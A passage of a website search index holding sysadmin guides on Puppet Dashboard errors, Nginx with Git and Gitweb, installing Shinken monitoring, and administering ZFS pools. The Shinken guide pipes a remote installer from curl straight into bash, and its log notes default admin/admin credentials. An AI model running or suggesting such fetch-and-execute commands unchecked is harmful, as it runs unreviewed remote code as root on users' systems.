or after 2011-11-01. Gem::SourceIndex#add_spec called from /usr/lib/ruby/1.9.1/rubygems/source_index.rb:91. NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01. Gem::SourceIndex#add_spec called from /usr/lib/ruby/1.9.1/rubygems/source_index.rb:91. NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01. Gem::SourceIndex#add_spec called from /usr/lib/ruby/1.9.1/rubygems/source_index.rb:91. NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01. Gem::SourceIndex#add_spec called from /usr/lib/ruby/1.9.1/rubygems/source_index.rb:91. NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01. Gem::SourceIndex#add_spec called from /usr/lib/ruby/1.9.1/rubygems/source_index.rb:91. NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01. Gem::SourceIndex#add_spec called from /usr/lib/ruby/1.9.1/rubygems/source_index.rb:91. NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01. Gem::SourceIndex#add_spec called from /usr/lib/ruby/1.9.1/rubygems/source_index.rb:91. NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01. Gem::SourceIndex#add_spec called from /usr/lib/ruby/1.9.1/rubygems/source_index.rb:91. NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01. Gem::SourceIndex#add_spec called from /usr/lib/ruby/1.9.1/rubygems/source_index.rb:91. NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01. Gem::SourceIndex#add_spec called from /usr/lib/ruby/1.9.1/rubygems/source_index.rb:91. NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01. Gem::SourceIndex#add_spec called from /usr/lib/ruby/1.9.1/rubygems/source_index.rb:91. NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01. Gem::SourceIndex#add_spec called from /usr/lib/ruby/1.9.1/rubygems/source_index.rb:91. rake aborted! cannot load such file -- ftools (See full trace by running task with --trace) It’s because the Ruby version you’re using doesn’t match what Puppet Dashboard requires. On Debian 7, you’re using 1.9.1 by default and you need to switch to 1.8 (hopefully they’ll update the dashboard soon). We’ll install some prerequisites:\naptitude install -y build-essential irb libmysql-ruby libmysqlclient-dev libopenssl-ruby libreadline-ruby mysql-server rake rdoc ri ruby ruby-dev Then we switch to Ruby 1.8:\nupdate-alternatives --install /usr/bin/gem gem /usr/bin/gem1.8 1 rm /etc/alternatives/ruby ln -s /usr/bin/ruby1.8 /etc/alternatives/ruby Now we’ll compile a version of rubygems:\nURL=\"http://production.cf.rubygems.org/rubygems/rubygems-1.3.7.tgz\" PACKAGE=$(echo $URL | sed \"s/\\.[^\\.]*$//; s/^.*\\///\") cd $(mktemp -d /tmp/install_rubygems.XXXXXXXXXX) \u0026\u0026 \\ wget -c -t10 -T20 -q $URL \u0026\u0026 \\ tar xfz $PACKAGE.tgz \u0026\u0026 \\ cd $PACKAGE \u0026\u0026 \\ sudo ruby setup.rb Now you can run db::migrate again.\nCaught TERM; calling stop linkIf you encounter this type of error message in Puppet Dashboard when launching Puppet runs from Mcollective, you need to work on the puppet manifest, to comment this line:\n[...] service { 'puppet-srv' : name =\u003e 'puppet', # Let this line commented if you're using Puppet Dashboard #ensure =\u003e stopped, enable =\u003e false } [...] Resources linkhttp://www.puppetlabs.com/blog/a-tour-of-puppet-dashboard-0-1-0/\nhttp://bitcube.co.uk/content/puppet-dashboard-v101-install\nhttp://www.mogilowski.net/lang/en-us/2011/01/20/puppet-dashboard-reports-ubuntu/\nhttp://www.craigdunn.org/2010/08/part-3-installing-puppet-dashboard-on-centos-puppet-2-6-1/\n"
            }
        );
    index.add(
            {
                id:  283 ,
                href: "\/Nginx_Git_et_Gitweb\/",
                title: "Nginx Git and Gitweb",
                description: "Guide to make Git over HTTP(S) and Gitweb coexist in an Nginx setup",
                content: "I spent a lot of time figuring out how to make Git over HTTP(S) and Gitweb coexist, but finally got it working.\ninfo Consider using the Gitweb method only if you don’t need Git over HTTP(S) Configuration Method linkHere’s the method I used:\nserver { listen 80; listen 443 ssl; ssl_certificate /etc/nginx/ssl/deimos.fr/server-unified.crt; ssl_certificate_key /etc/nginx/ssl/deimos.fr/server.key; ssl_session_timeout 5m; server_name git.deimos.fr; root /usr/share/gitweb/; access_log /var/log/nginx/git.deimos.fr_access.log; error_log /var/log/nginx/git.deimos.fr_error.log; index gitweb.cgi; # Drop config include drop.conf; # Git over https location /git/ { alias /var/cache/git/; if ($scheme = http) { rewrite ^ https://$host$request_uri permanent; } } # Gitweb location ~ gitweb\\.cgi { fastcgi_cache mycache; fastcgi_cache_key $request_method$host$request_uri; fastcgi_cache_valid any 1h; include fastcgi_params; fastcgi_pass unix:/run/fcgiwrap.socket; } } With this configuration, Git over HTTPS is working (HTTP is redirected to HTTPS) and Gitweb is working too since everything matching gitweb.cgi is correctly routed.\nRepository Configuration linkFor the Git part, we need to authorize the repositories we want to expose. For this, we need to rename a file in our repository and run a command:\ncd /var/cache/git/myrepo.git hooks/post-update{.sample,} su - www-data -c 'cd /var/cache/git/myrepo.git \u0026\u0026 /usr/lib/git-core/git-update-server-info' Replace www-data with the user that has permissions on the repository. Use www-data so that Nginx has the necessary rights.\nUsing the Repository linkAfter this setup, you can clone your repository:\ngit clone http://www.deimos.fr/git/deimosfr.git deimosfr "
            }
        );
    index.add(
            {
                id:  284 ,
                href: "\/Shinken_:_Installation_et_configuration_du_successeur_de_Nagios\/",
                title: "Shinken: Installation and Configuration of Nagios' Successor",
                description: "A guide on installing and configuring Shinken, a powerful open-source monitoring solution that's compatible with Nagios but provides better performance and flexibility for distributed monitoring.",
                content: " Software version 1.2.2 Operating System Debian 7 Website Shinken Website Last Update 03/01/2013 Introduction linkShinken1 is an application for system and network monitoring. It monitors specified hosts and services, alerting when systems malfunction and when they recover. It is free software under the GNU AGPL license. It is fully compatible with Nagios and aims to provide distributed and highly available monitoring that’s easy to set up. Starting as a proof of concept for distributed architectures in Nagios, the program quickly demonstrated much better performance and flexibility than its predecessor.\nFollowing the Nagios developers’ refusal in December 2009 to make Shinken the new development branch of Nagios in the future, Shinken can now be considered an independent system and network monitoring project.\nInstallation linkWe could choose to install Shinken from the official Debian repositories, but unfortunately, that’s an old version as the project evolves very quickly. There’s an official installer that will allow us to get the latest version and all necessary dependencies. First, let’s install curl:\naptitude install curl Then we launch the installation:\n\u003e curl -L http://install.shinken-monitoring.org | /bin/bash % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 0 0 0 0 0 0 0 0 --:--:-- --:--:-- --:--:-- 0 100 1533 100 1533 0 0 9919 0 --:--:-- --:--:-- --:--:-- 9919 Preparing the temporary directory /tmp/shinken-install-MDZFhh6 ######################################################################## 100.0% Unziping the Shinken package shinken-1.2.2.tar.gz +-------------------------------------------------------------------------------- | Verifying compatible distros +-------------------------------------------------------------------------------- \u003e Found DEBIAN (Debian 7 x86_64) \u003e Version checking for Debian is not needed +-------------------------------------------------------------------------------- | Checking for existing installation +-------------------------------------------------------------------------------- +-------------------------------------------------------------------------------- | Checking prerequisites +-------------------------------------------------------------------------------- \u003e Checking for wget: OK \u003e Checking for sed: OK \u003e Checking for awk: OK \u003e Checking for grep: OK \u003e Checking for python: OK \u003e Checking for bash: OK \u003e Installing build-essential \u003e Installing libperl-dev \u003e Installing python-setuptools \u003e Installing libsqlite3-dev \u003e Installing python-dev \u003e Installing pyro \u003e Installing sqlite3 \u003e Installing nmap \u003e Installing unzip \u003e Installing libmysqlclient-dev \u003e Installing python-ldap \u003e Installing libevent-dev \u003e Module paramiko (paramiko) not found. Installing... \u003e Module netifaces (netifaces) not found. Installing... \u003e Module simplejson (simplejson) not found. Installing... \u003e Module pysqlite found. \u003e Module MySQL_python (MySQLdb) not found. Installing... \u003e Module pymongo (pymongo) not found. Installing... \u003e Module kombu (kombu) not found. Installing... +-------------------------------------------------------------------------------- | Creating user +-------------------------------------------------------------------------------- +-------------------------------------------------------------------------------- | Relocate source tree to /usr/local/shinken +-------------------------------------------------------------------------------- \u003e relocating macro /usr/local/shinken/install.d/tools/macros/enable_log_mongo.macro \u003e relocating macro /usr/local/shinken/install.d/tools/macros/enable_retention_mongo.macro \u003e relocating macro /usr/local/shinken/install.d/tools/macros/disable_npcd.macro \u003e relocating macro /usr/local/shinken/install.d/tools/macros/set_webui_ouptput_length.macro \u003e relocating macro /usr/local/shinken/install.d/tools/macros/enable_npcd.macro \u003e relocating macro /usr/local/shinken/install.d/tools/macros/control_satelites.macro \u003e relocating macro /usr/local/shinken/install.d/tools/macros/enable_retention.macro \u003e relocate nagios plugin path \u003e Processing ./FOR_DEV \u003e Processing ./FROM_NAGIOS_TO_SHINKEN \u003e Processing ./README \u003e Processing ./README.rst \u003e Processing ./contrib/nconf/deployment.ini \u003e Processing ./etc/resource.cfg \u003e Processing ./etc/shinken-specific.cfg \u003e Processing ./etc/shinken-specific.cfg.orig \u003e Processing ./external_commands/ACKNOWLEDGE_HOST_PROBLEM.sh \u003e Processing ./external_commands/ADD_POLLER.sh \u003e Processing ./external_commands/CHANGE_CONTACT_HOST_NOTIFICATION_TIMEPERIOD.sh \u003e Processing ./external_commands/PROCESS_HOST_CHECK_RESULT.sh \u003e Processing ./install \u003e Processing ./install.d/config.nconf/deployment.ini \u003e Processing ./install.d/config.nconf/nconf.php \u003e Processing ./install.d/shinken.conf \u003e Processing ./install.d/tools/macros/control_satelites.macro \u003e Processing ./install.d/tools/macros/disable_npcd.macro \u003e Processing ./install.d/tools/macros/enable_log_mongo.macro \u003e Processing ./install.d/tools/macros/enable_npcd.macro \u003e Processing ./install.d/tools/macros/enable_retention.macro \u003e Processing ./install.d/tools/macros/enable_retention_mongo.macro \u003e Processing ./install.d/tools/macros/set_webui_ouptput_length.macro \u003e Processing ./libexec/SAN_discover_runner.py \u003e Processing ./libexec/eue/glpi.ini \u003e Processing ./libexec/eue/glpi.ini.in \u003e Processing ./libexec/fs_discovery_runner.py \u003e Processing ./libexec/vmware_discovery_runner.py \u003e Processing ./shinken/modules/npcdmod_broker.py \u003e Processing ./shinken/objects/config.py \u003e Processing ./shinken/webui/plugins/eue/eue.py +-------------------------------------------------------------------------------- | Set some configuration directives +-------------------------------------------------------------------------------- \u003e Processing /usr/local/shinken/etc/brokerd.ini \u003e Going to /usr/local/shinken \u003e Setting workdir to /usr/local/shinken/var in /usr/local/shinken/etc/brokerd.ini \u003e Setting user to shinken in /usr/local/shinken/etc/brokerd.ini \u003e Setting group to shinken in /usr/local/shinken/etc/brokerd.ini \u003e Processing /usr/local/shinken/etc/pollerd.ini \u003e Going to /usr/local/shinken \u003e Setting workdir to /usr/local/shinken/var in /usr/local/shinken/etc/pollerd.ini \u003e Setting user to shinken in /usr/local/shinken/etc/pollerd.ini \u003e Setting group to shinken in /usr/local/shinken/etc/pollerd.ini \u003e Processing /usr/local/shinken/etc/reactionnerd.ini \u003e Going to /usr/local/shinken \u003e Setting workdir to /usr/local/shinken/var in /usr/local/shinken/etc/reactionnerd.ini \u003e Setting user to shinken in /usr/local/shinken/etc/reactionnerd.ini \u003e Setting group to shinken in /usr/local/shinken/etc/reactionnerd.ini \u003e Processing /usr/local/shinken/etc/receiverd.ini \u003e Going to /usr/local/shinken \u003e Setting workdir to /usr/local/shinken/var in /usr/local/shinken/etc/receiverd.ini \u003e Setting user to shinken in /usr/local/shinken/etc/receiverd.ini \u003e Setting group to shinken in /usr/local/shinken/etc/receiverd.ini \u003e Processing /usr/local/shinken/etc/schedulerd.ini \u003e Going to /usr/local/shinken \u003e Setting workdir to /usr/local/shinken/var in /usr/local/shinken/etc/schedulerd.ini \u003e Setting user to shinken in /usr/local/shinken/etc/schedulerd.ini \u003e Setting group to shinken in /usr/local/shinken/etc/schedulerd.ini \u003e Enable retention for broker scheduler and arbiter \u003e Installing startup scripts \u003e Enabling Debian startup script +-------------------------------------------------------------------------------- | Install mongodb server +-------------------------------------------------------------------------------- \u003e repository configuration not found. Adding 10 gen repository \u003e Installing mongodb server +-------------------------------------------------------------------------------- | Applying various fixes +-------------------------------------------------------------------------------- \u003e Starting shinken +------------------------------------------------------------------------------ | Shinken is now installed on your server | The install location is: /usr/local/shinken | The configuration folder is: /usr/local/shinken/etc | | The Web Interface is available at: http://localhost:7767 | The default credentials for the webui are admin/admin | | You can now learn how to configure shinken at: http://www.shinken-monitoring.org/wiki +------------------------------------------------------------------------------ \u003e updated configuration of module[3] passwd=/usr/local/shinken/etc/htpasswd.users updated configuration of module[3] passwd=/usr/local/shinken/etc/htpasswd.users \u003e Found installation parameters --\u003e ETC=/usr/local/shinken/etc --\u003e VAR=/usr/local/shinken/var --\u003e LIBEXEC=/usr/local/shinken/libexec --\u003e TARGET=/usr/local/shinken \u003e checking if shinken is installed in /usr/local/shinken +-------------------------------------------------------------------------------- | Install nagios plugins +-------------------------------------------------------------------------------- \u003e Installing prerequisites \u003e Getting nagios-plugins archive \u003e Extract archive content \u003e Configure source tree \u003e Building .... \u003e Installing \u003e Found installation parameters --\u003e ETC=/usr/local/shinken/etc --\u003e VAR=/usr/local/shinken/var --\u003e LIBEXEC=/usr/local/shinken/libexec --\u003e TARGET=/usr/local/shinken \u003e checking if shinken is installed in /usr/local/shinken +-------------------------------------------------------------------------------- | Install check_mem +-------------------------------------------------------------------------------- \u003e Downloading check_mem \u003e Extracting archive \u003e Installing plugin \u003e Found installation parameters --\u003e ETC=/usr/local/shinken/etc --\u003e VAR=/usr/local/shinken/var --\u003e LIBEXEC=/usr/local/shinken/libexec --\u003e TARGET=/usr/local/shinken \u003e checking if shinken is installed in /usr/local/shinken +-------------------------------------------------------------------------------- | Install manubulon plugins +-------------------------------------------------------------------------------- \u003e Installing prerequisites \u003e Getting manubulon archive \u003e Extract archive content \u003e Relocate libs =\u003e Processing /tmp/nagios_plugins/check_snmp_boostedge.pl =\u003e Installing /tmp/nagios_plugins/check_snmp_boostedge.pl =\u003e Processing /tmp/nagios_plugins/check_snmp_cpfw.pl =\u003e Installing /tmp/nagios_plugins/check_snmp_cpfw.pl =\u003e Processing /tmp/nagios_plugins/check_snmp_css.pl =\u003e Installing /tmp/nagios_plugins/check_snmp_css.pl =\u003e Processing /tmp/nagios_plugins/check_snmp_css_main.pl =\u003e Installing /tmp/nagios_plugins/check_snmp_css_main.pl =\u003e Processing /tmp/nagios_plugins/check_snmp_env.pl =\u003e Installing /tmp/nagios_plugins/check_snmp_env.pl =\u003e Processing /tmp/nagios_plugins/check_snmp_int.pl =\u003e Installing /tmp/nagios_plugins/check_snmp_int.pl =\u003e Processing /tmp/nagios_plugins/check_snmp_linkproof_nhr.pl =\u003e Installing /tmp/nagios_plugins/check_snmp_linkproof_nhr.pl =\u003e Processing /tmp/nagios_plugins/check_snmp_load.pl =\u003e Installing /tmp/nagios_plugins/check_snmp_load.pl =\u003e Processing /tmp/nagios_plugins/check_snmp_mem.pl =\u003e Installing /tmp/nagios_plugins/check_snmp_mem.pl =\u003e Processing /tmp/nagios_plugins/check_snmp_nsbox.pl =\u003e Installing /tmp/nagios_plugins/check_snmp_nsbox.pl =\u003e Processing /tmp/nagios_plugins/check_snmp_process.pl =\u003e Installing /tmp/nagios_plugins/check_snmp_process.pl =\u003e Processing /tmp/nagios_plugins/check_snmp_storage.pl =\u003e Installing /tmp/nagios_plugins/check_snmp_storage.pl =\u003e Processing /tmp/nagios_plugins/check_snmp_vrrp.pl =\u003e Installing /tmp/nagios_plugins/check_snmp_vrrp.pl =\u003e Processing /tmp/nagios_plugins/check_snmp_win.pl =\u003e Installing /tmp/nagios_plugins/check_snmp_win.pl \u003e Found installation parameters --\u003e ETC=/usr/local/shinken/etc --\u003e VAR=/usr/local/shinken/var --\u003e LIBEXEC=/usr/local/shinken/libexec --\u003e TARGET=/usr/local/shinken \u003e checking if shinken is installed in /usr/local/shinken +-------------------------------------------------------------------------------- | Install pnp4nagios addon +-------------------------------------------------------------------------------- \u003e Found installation parameters --\u003e ETC=/usr/local/shinken/etc --\u003e VAR=/usr/local/shinken/var --\u003e LIBEXEC=/usr/local/shinken/libexec --\u003e TARGET=/usr/local/shinken \u003e Installing prerequisites \u003e Getting pnp4nagios archive \u003e Extracting archive \u003e Configuring source tree \u003e Building .... \u003e Installing \u003e Fix htpasswd.users path \u003e Enable npcdmod \u003e using ip address: x.x.x.x \u003e Starting npcd Exiting It’s now installed with its dependencies :-). We can restart it:\n/etc/init.d/shinken restart or\nservice shinken restart Plugins linkWe can also install additional plugins such as Nagios plugins:\n/usr/local/shinken/install -p nagios-plugins Once installed, the plugins are located in /usr/local/shinken/libexec.\nIf you want to see the list of available Shinken plugins:\n\u003e /usr/local/shinken/install -h [...] -p | --plugin Install plugins. Argument should be one of the following: check_esx3 nagios-plugins check_oracle_health check_mysql_health capture_plugin check_wmi_plus check_mongodb check_emc_clariion check_nwc_health manubulon (snmp plugins) check_hpasm check_netapp2 check_mem (local enhanced memory check plugin) check_snmp_bandwidth (check bandwidth usage with snmp) check_netint (enhanced version of check_snmp_int plugins) check_IBM check_IBM_DS check_rsync [...] Configuration linkFAQ linkOpening the log file ‘arbiterd.log’ failed with ‘[Errno 13] Permission denied linkIf you get this kind of message, it’s simply due to a permission problem that the installer forgot:\nFAILED: [1357199441] Error : Opening the log file 'arbiterd.log' failed with '[Errno 13] Permission denied: u'/usr/local/shinken/var/arbiterd.log (full output is in /tmp/bad_start_for_arbiter) ... failed! You can fix the problem by reassigning permissions:\nservice shinken stop chown -R shinken:shinken /usr/local/shinken service shinken start References link http://fr.wikipedia.org/wiki/Shinken_%28logiciel%29 ↩︎\n"
            }
        );
    index.add(
            {
                id:  285 ,
                href: "\/ZFS_:_Le_FileSystem_par_excellence\/",
                title: "ZFS: The Filesystem Par Excellence",
                description: "Complete guide on using ZFS filesystem, including creating and managing zpools, partitions, swap space management, and advanced usage techniques",
                content: " Introduction linkZFS or Z File System is an open-source filesystem under the CDDL license. The ‘Z’ doesn’t officially stand for anything specific, but has been referred to in various ways in the press, such as Zettabyte (from the English unit zettabyte for data storage), or ZFS as “the last word in filesystems”.\nProduced by Sun Microsystems for Solaris 10 and above, it was designed by Jeff Bonwick’s team. Announced for September 2004, it was integrated into Solaris on October 31, 2005, and on November 16, 2005, as a feature of OpenSolaris build 27. Sun announced that ZFS was integrated into the Solaris update dated June 2006, a year after the opening of the OpenSolaris community.\nThe characteristics of this filesystem include its very high storage capacity, the integration of all previous concepts related to filesystems and volume management into a single product. It integrates on-disk structure, is lightweight, and easily allows setting up a storage management platform.\nLocating Your Disks linkUse your usual tools to identify your disks. For example, under Solaris:\nbash-3.00# format Searching for disks...done AVAILABLE DISK SELECTIONS: 0. c0t600A0B80005A2CAA000004104947F51Ed0 /scsi_vhci/disk@g600a0b80005a2caa000004104947f51e 1. c0t600A0B80005A2CB20000040B4947F57Fd0 /scsi_vhci/disk@g600a0b80005a2cb20000040b4947f57f 2. c1t1d0 /pci@0,0/pci8086,25e2@2/pci8086,3500@0/pci8086,3510@0/pci1000,3150@0/sd@1,0 3. c2t1d31 /pci@0,0/pci8086,25f8@4/pci1077,143@0/fp@0,0/disk@w203400a0b85a2caa,1f 4. c3t3d31 /pci@0,0/pci8086,25f8@4/pci1077,143@0,1/fp@0,0/disk@w203500a0b85a2caa,1f Zpool linkA Zpool is similar to a VG (Volume Group) for those familiar with LVM. The issue is that at the time of writing this article, you cannot reduce the size of a zpool, but you can increase it. You can use a zpool directly as a filesystem since it’s based on ZFS. However, you can create ZFS filesystems (that’s what they’re called, I know it’s confusing, but think of them more like LVs (Logical Volumes) or partitions). You can also create other filesystems containing other filesystem types (NTFS, EXT4, REISERFS…).\nCreating a Zpool linkTo create a zpool, follow these steps:\nzpool create zpool_name c0t600A0B80005A2CAA000004104947F51Ed0 zpool_name: specify the name you want for the zpool c0t600A0B80005A2CAA000004104947F51Ed0: this is the device name displayed by the format command Listing Zpools linkSimple Zpool linkTo know which pools exist on the machine:\nzpool list Raid-Z linkA Raid-Z is like a Raid 5, but without one major problem: no parity resynchronization or loss during a power outage. Here’s how to do it:\nzpool create my_raidz raidz c1t0d0 c2t0d0 c3t0d0 c4t0d0 /dev/dsk/c5t0d0 Mounting a Zpool linkBy default, zpools have the mount point /zpool_name. To mount a zpool, we’ll use the zfs command:\nzfs mount zpool_name It will remember where it should be mounted, as this information is stored in the filesystem.\nUnmounting a Zpool linkThis is super simple, as usual:\numount /zpool_name Just use umount followed by the mount point.\nDeleting a Zpool linkTo delete a zpool:\nzpool destroy zpool_name Expanding a Zpool linkTo expand a zpool, we’ll use the zpool name and the additional device:\nzpool add zpool_name device1 device2... Modifying Zpool Parameters linkChanging the Mount Point of a Zpool linkBy default, zpools are mounted in /, to change this:\nzfs set mountpoint=/mnt/datas my_zpool /mnt/datas: the desired mount point my_zpool: name of the zpool Importing All Zpools linkTo import all zpools:\nzpool import -f -a -f: force (optional and may be dangerous in some cases) -a: will import all zpools Renaming a Zpool linkRenaming a zpool is actually not very complicated:\nzpool export mon_zpool zpool import mon_zpool mon_nouveau_nom_de_zpool And that’s it, the zpool is renamed :-).\nUsing in a Cluster Environment linkIn a cluster environment, you’ll need to mount and unmount zpools quite regularly. If you use Sun Cluster (at the time of writing this in version 3.2), you are forced to use zpools for mounting partitions. Filesystems cannot be mounted and unmounted from one node to another when they belong to the same zpool.\nYou’ll therefore need to unmount the zpool, export the information in ZFS, then import it on the other node. Imagine the following scenario:\nsun-node1 (node 1) sun-node2 (node 2) 1 disk array with 1 LUN of 10 GB The LUN is a zpool created as described earlier in this document on sun-node1. Now you need to switch this zpool to sun-node2. Since ZFS is not a cluster filesystem, you must unmount it, export the information, then import it. Unmounting is not mandatory since the export will do it, but if you want to do things properly, then let’s proceed on sun-node1:\numount /zpool_name export zpool_name Now, list the available zpools, you should no longer see it. Let’s move to sun-node2:\nzpool import zpool_name There you go, you’ll find your files, normally it’s automatically mounted, but if for some reason it’s not, you can do it manually (see above).\nZFS linkCreating a ZFS Partition linkTo create a ZFS partition, it’s extremely simple! You obviously have your Zpool created first, then you execute:\nzfs create zpool/partition Then you can specify options with -o and see all available options with:\nzfs get all zpool/partition Renaming a Partition linkTo rename a ZFS partition. If you want to rename a ZFS partition, nothing could be simpler:\nzfs rename zpool/partitionold zpool/partitionnew Managing Swap on ZFS linkOn Solaris, you can use multiple combined swap spaces (partitions + files indifferently).\nTo list the swap spaces used:\n\u003e swap -l swapfile dev swaplo blocks free /dev/zvol/dsk/rpool/swap1 181,3 8 4194296 4194296 /dev/zvol/dsk/rpool/swap 181,2 8 62914552 62914552 To know a bit more, you can also use:\n\u003e swap -s total: 283264k bytes allocated + 258412k reserved = 541676k used, 31076108k available Here we have two ZFS volumes used as swap. By default, when creating a ZPOOL, a swap space is created “rpool/swap”.\nAdding SWAP linkYou just need to increase the size of the ZFS associated with the swap.\nAdding a Swap linkLet’s verify the number of assigned swaps:\n\u003e swap -l swapfile dev swaplo blocks free /dev/dsk/c1t0d0s1 30,65 8 8401984 8401984 Now we add a ZFS:\nzfs create -V 30G rpool/swap1 Here we’ve just created the swap at 30G. Then we declare this new partition as swap:\nswap -a /dev/zvol/dsk/rpool/swap1 Now, when I display the list of active partitions, I can see the new one:\n\u003e swap -l swapfile dev swaplo blocks free /dev/dsk/c1t0d0s1 30,65 8 8401984 8401984 /dev/dsk/c1t0d0s5 30,69 8 146801960 146801960 If you get a message like this:\n/dev/zvol/dsk/rpool/swap is in use for live upgrade -. Please see ludelete(1M). You’ll need to use the following command to activate it:\n/sbin/swapadd Expanding a Swap linkWhen the machine is running and the swap space is being used, you can increase the size of the swap so the system can use it. This will require deactivation and reactivation for the new space to be taken into account. For this, we’ll expand the zfs:\nzfs set volsize=72G rpool/swap zfs set refreservation=72G rpool/swap Now we’ll deactivate the swap:\nswap -d /dev/zvol/dsk/rpool/swap You now need to delete or comment out the entry in /etc/vfstab that corresponds to the swap, as it will be automatically created in the next step:\n#/dev/zvol/dsk/rpool/swap - - swap - no - Then reactivate it so the new size is taken into account:\nswap -a /dev/zvol/dsk/rpool/swap You can check the swap size:\n\u003e swap -l swapfile dev swaplo blocs libres /dev/zvol/dsk/rpool/swap 181,1 8 150994936 150994936 Advanced Usage linkThe ZFS ARC Cache linkThe problem with ZFS is that it’s very RAM-hungry (about 1/8 of the total + swap). This can quickly become problematic on machines with a lot of RAM. Here’s some explanation.\nAvailable Memory mdb -k and ZFS ARC I/O Cache linkThe mdb -k command with the ::memstat option provides a global view of available memory on a Solaris machine:\necho ::memstat | mdb -k Page Summary Pages MB %Tot ------------ ---------------- ---------------- ---- Kernel 587481 2294 7% Anon 180366 704 2% Exec and libs 6684 26 0% Page cache 7006 27 0% Free (cachelist) 13192 51 0% Free (freelist) 7591653 29654 91% Total 8386382 32759 Physical 8177488 31943 In the example above, this is a machine with 32 GB of physical memory.\nZFS uses a kernel cache called ARC for I/Os. To know the size of the I/O cache at a given time used by ZFS, use the kmastat option with the mdb -k command and look for the Total [zio_buf] statistic:\necho ::kmastat | mdb -k cache buf buf buf memory alloc alloc name size in use total in use succeed fail ------------------------- ------ ------ ------ --------- --------- ----- ... Total [zio_buf] 1157632000 1000937 0 ... In the example above, the ZFS I/O cache uses 1.1 GB in memory.\nLimiting the ZFS ARC Cache (zfs_arc_max and zfs_arc_min) linkFor machines with a very large amount of memory, it’s better to limit the ZFS I/O cache to avoid any memory overflow on other applications. In practice, this cache increases and decreases dynamically based on the needs of applications installed on the machine, but it’s better to limit it to prevent any risk. The zfs_arc_max parameter (in bytes) in the /etc/system file allows limiting the amount of memory for the ZFS I/O cache. Below is an example where the ZFS I/O cache is limited to 4GB:\n... set zfs:zfs_arc_max = 4294967296 ... Statistics on the ZFS ARC Cache (kstat zfs) linkSimilarly, you can specify the minimum amount of memory to allocate to the ZFS I/O cache with the zfs_arc_min parameter in the /etc/system file.\nThe kstat command with the zfs option provides detailed statistics on the ZFS ARC cache (hits, misses, size, etc.) at a given time: you’ll find the maximum possible value (c_max) for this cache, the current size (size) in the output of this command. In the example below, the zfs_arc_max parameter hasn’t yet been applied, which explains why the maximum possible size corresponds to the physical memory of the machine.\n\u003e kstat zfs module:zfs instance: 0 name: arcstats class: misc c 33276878848 c_max 33276878848 c_min 4159609856 crtime 121.419237623 deleted 497690 demand_data_hits 14319099 demand_data_misses 6491 demand_metadata_hits 45356553 demand_metadata_misses 33470 evict_skip 2004 hash_chain_max 4 hash_chains 1447 hash_collisions 1807933 hash_elements 40267 hash_elements_max 41535 hdr_size 6992496 hits 60821130 l2_abort_lowmem 0 l2_cksum_bad 0 l2_evict_lock_retry 0 l2_evict_reading 0 l2_evict_reading 0 l2_feeds 0 l2_free_on_write 0 l2_hdr_size 0 l2_hits 0 l2_io_error 0 l2_misses 0 l2_rw_clash 0 l2_size 0 l2_writes_done 0 l2_writes_error 0 l2_writes_hdr_miss 0 l2_writes_sent 0 memory_throttle_count 0 mfu_ghost_hits 3387 mfu_hits 53995731 misses 48704 mru_ghost_hits 1180 mru_hits 5891117 mutex_miss 0 p 21221559296 prefetch_data_hits 237031 prefetch_data_misses 3520 prefetch_metadata_hits 908447 prefetch_metadata_misses 5223 recycle_miss 0 size 1362924368 snaptime 14013729.1668961 module:zfs instance: 0 name: vdev_cache_stats class: misc crtime 121.419271852 delegations 4453 hits 27353 misses 9753 snaptime 14013729.1677954 I also recommend the excellent arc_summary which provides very precise information or arcstat.\nNot Mounting All Zpools at Boot linkIf you encounter errors when booting your machine during zpool mounting (in my case, a continuous reboot of the machine), there is a solution that allows it to forget all those that were imported during the last session (ZFS remembers imported zpools and automatically reimports them during a boot, which is convenient but can be constraining in some cases).\nTo do this, you’ll need to boot in single user or multi-user mode (if it doesn’t work, try failsafe mode for Solaris (chrooted for Linux)), then we’ll remove the ZFS cache:\nmv /etc/zfs/zpool.cache /etc/zfs/zpool.cache.`date \"+%Y-%m-%d\"` If your OS is installed on ZFS, and you’re in failsafe mode, you’ll need to repopulate the cache (the /a corresponds to the root under Solaris):\ncd / bootadm update-archive -R /a umount /a Then reboot and reimport the desired zpools.\nFAQ linkFAULTED linkI got a little FAULTED as you can see below without really knowing why:\nbash-3.00# zpool list NAME SIZE USED AVAIL CAP HEALTH ALTROOT test1 - - - - FAULTED - Here we need to debug a bit. For that, we use the following command:\nbash-3.00# zpool status -x pool: test1 state: UNAVAIL status: One or more devices could not be opened. There are insufficient replicas for the pool to continue functioning. action: Attach the missing device and online it using 'zpool online'. see: http://www.sun.com/msg/ZFS-8000-3C scrub: none requested config: NAME STATE READ WRITE CKSUM test1 UNAVAIL 0 0 0 insufficient replicas c4t600A0B800048A9B6000005B84A8293C9d0 UNAVAIL 0 0 0 cannot open That doesn’t look good! The error messages are scary. Yet the solution is simple: just export and reimport (forcing if necessary) the defective zpools.\nThen, you can check the status of your filesystem via a scrub:\nzpool scrub test1 zpool status How to Repair Grub After Zpool Upgrade linkIt appears that zpool upgrade can break the grub bootloader.\nTo fix this, we need to reinstall grub on the partition. Proceed as follows:\nUnplug all fiber cables from the server (or other disks than the OS) Boot on Solaris 10 Install DVD On boot Select option 6: “Start Single User Shell” It will scan for existing zpool containing OS installation then ask you if you want to mount your rpool to /a. Answer “yes” When you get the prompt, launch this to check the status of the rpool: \u003e zpool status rpool pool: rpool state: ONLINE scrub: none requested config: NAME STATE READ WRITE CKSUM rpool ONLINE 0 0 0 